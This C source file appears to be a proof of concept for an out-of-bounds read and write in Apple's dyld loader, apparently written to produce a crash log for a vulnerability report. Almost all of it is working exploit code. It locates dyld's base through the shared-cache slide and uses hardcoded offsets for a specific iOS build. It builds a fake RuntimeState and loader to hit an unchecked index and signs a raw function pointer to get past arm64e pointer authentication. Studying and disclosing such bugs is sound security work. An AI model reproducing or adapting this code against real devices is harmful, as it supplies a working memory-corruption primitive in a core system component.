/*
 * crash_helper.c — deterministic .ips proof for the dyld4 OOB.
 *
 * We call dyld's own unchecked accessor with a crafted RuntimeState whose
 * validation array is placed so that index (Ref & 0x7fff) = 32767 lands on a
 * read-only guard page. The resulting SIGSEGV PC is the EXACT unchecked
 * ldrb/strb instruction inside /usr/lib/dyld — visible in the .ips.
 *
 * Verified against dyld (iOS 27.0.1, 24A446), __TEXT base 0x18047c000:
 *   recursiveMarkBeingValidated : 0x1804b79fc  -> offset 0x3b9fc
 *   OOB read   ldrb [x8,x9]      : 0x1804b7a40  -> offset 0x3ba40
 *   OOB write  strb [x8,x9]      : 0x1804b7a84  -> offset 0x3ba84
 *
 * recursiveMarkBeingValidated(this=loader, state, bool):
 *   ldrh w9, [x0,#6]          ; loader.Ref (u16) = 0xffff
 *   csel x8, 0x450/0x438      ; sign bit set -> state[+0x450]
 *   ldr  x8, [x1, x8]         ; validation array base
 *   and  x9, x9, #0x7fff      ; idx = 32767
 *   ldrb w10,[x8, x9]         ; OOB read  (we make this SUCCEED)
 *   cbz  w2  -> write path    ; we pass flag = 0
 *   strb #1, [x8, x9]         ; OOB write -> faults on read-only page
 */

#include <dlfcn.h>
#include <sys/mman.h>
#include <ptrauth.h>
#include <mach-o/loader.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define REC_MARK_OFFSET 0x3b9fc
#define OOB_STRB_OFFSET 0x3ba84
#define DYLD_TEXT_VMADDR 0x18047c000ULL

static char g_buf[512];

/* __TEXT vmaddr from a mach_header_64 (every image in the shared cache). */
static uintptr_t text_vmaddr(const void *mhbase) {
    const struct mach_header_64 *mh = (const struct mach_header_64 *)mhbase;
    if (mh->magic != MH_MAGIC_64) return 0;
    const uint8_t *p = (const uint8_t *)(mh + 1);
    for (uint32_t i = 0; i < mh->ncmds; i++) {
        const struct load_command *lc = (const struct load_command *)p;
        if (lc->cmdsize < sizeof(struct load_command)) return 0;
        if (lc->cmd == LC_SEGMENT_64) {
            const struct segment_command_64 *seg = (const struct segment_command_64 *)lc;
            if (strcmp(seg->segname, "__TEXT") == 0) return (uintptr_t)seg->vmaddr;
        }
        p += lc->cmdsize;
    }
    return 0;
}

const char *probe_crash_dyld(int fire) {
    /* Locate any public dyld API symbol. Whether dlsym resolves it to dyld
     * itself or to libdyld.dylib, that image is in the SAME dyld shared cache,
     * so its (load address - __TEXT vmaddr) is the cache slide. Apply that
     * slide to dyld's fixed __TEXT vmaddr to get dyld's true base. */
    static const char *candidates[] = {
        "dyld_get_image_header", "_dyld_get_image_header",
        "dyld_get_image_name", "_dyld_get_image_name",
        "dyld_get_image_vmaddr_slide", "_dyld_get_image_vmaddr_slide"
    };
    Dl_info di; memset(&di, 0, sizeof(di));
    const char *imageName = "(none)";
    for (unsigned i = 0; i < sizeof(candidates) / sizeof(candidates[0]); i++) {
        void *h = dlsym(RTLD_DEFAULT, candidates[i]);
        if (!h) continue;
        Dl_info t; memset(&t, 0, sizeof(t));
        if (dladdr(h, &t) != 0 && t.dli_fname) { di = t; imageName = t.dli_fname; break; }
    }
    if (!di.dli_fbase) {
        snprintf(g_buf, sizeof(g_buf), "CRASH: no dyld API symbol found via dlsym");
        return g_buf;
    }

    uintptr_t imgVM = text_vmaddr(di.dli_fbase);
    if (!imgVM) {
        snprintf(g_buf, sizeof(g_buf), "CRASH: cannot read __TEXT vmaddr of %s", imageName);
        return g_buf;
    }
    uintptr_t slide = (uintptr_t)di.dli_fbase - imgVM;
    uintptr_t base  = slide + (uintptr_t)DYLD_TEXT_VMADDR;

    /* Verify the derived dyld base really is dyld before calling into it. */
    if (text_vmaddr((void *)base) != (uintptr_t)DYLD_TEXT_VMADDR) {
        snprintf(g_buf, sizeof(g_buf), "CRASH: bad dyld base 0x%lx (via %s)", (unsigned long)base, imageName);
        return g_buf;
    }
    uintptr_t fn   = base + REC_MARK_OFFSET;
    uintptr_t strb = base + OOB_STRB_OFFSET;
    snprintf(g_buf, sizeof(g_buf),
             "CRASH-SETUP via=%s slide=0x%lx base=0x%lx fn(recMark)=0x%lx OOB-strb=0x%lx expected-fault-PC=0x%lx",
             imageName, (unsigned long)slide, (unsigned long)base, (unsigned long)fn,
             (unsigned long)strb, (unsigned long)strb);
    if (!fire) return g_buf;   /* info pass: written to report BEFORE the crash */

    /* PROT_NONE arena; page 7 holds idx 0x7fff. Make it READ-ONLY so the OOB
     * read succeeds (value 0) and the OOB write faults at the strb. */
    void *mem = mmap(NULL, 0x10000, PROT_NONE, MAP_PRIVATE | MAP_ANON, -1, 0);
    if (mem == MAP_FAILED) { snprintf(g_buf, sizeof(g_buf), "CRASH: mmap failed"); return g_buf; }
    if (mprotect((char *)mem + 7 * 4096, 4096, PROT_READ) != 0) {
        snprintf(g_buf, sizeof(g_buf), "CRASH: mprotect failed");
        return g_buf;
    }

    /* fake RuntimeState: validation-array pointer at +0x450 */
    uint8_t *state = (uint8_t *)calloc(1, 0x500);
    if (!state) { snprintf(g_buf, sizeof(g_buf), "CRASH: state alloc failed"); return g_buf; }
    memcpy(state + 0x450, &mem, sizeof(mem));

    /* fake loader: Ref u16 = 0xffff at +0x6 (idx 0x7fff, sign bit selects +0x450) */
    uint8_t *loader = (uint8_t *)calloc(1, 16);
    if (!loader) { snprintf(g_buf, sizeof(g_buf), "CRASH: loader alloc failed"); return g_buf; }
    loader[6] = 0xff; loader[7] = 0xff;

    /* arm64e: sign the computed address as an A-key function pointer so the
     * compiler-emitted braa reaches dyld instead of faulting in our app. */
    void *sfn = ptrauth_sign_unauthenticated((void *)fn, ptrauth_key_function_pointer, 0);
    typedef void (*recfn)(void *, void *, unsigned long);
    ((recfn)sfn)(loader, state, 0);   /* expected: SIGSEGV inside dyld at strb */

    snprintf(g_buf, sizeof(g_buf), "CRASH: returned unexpectedly (no fault)");
    return g_buf;
}
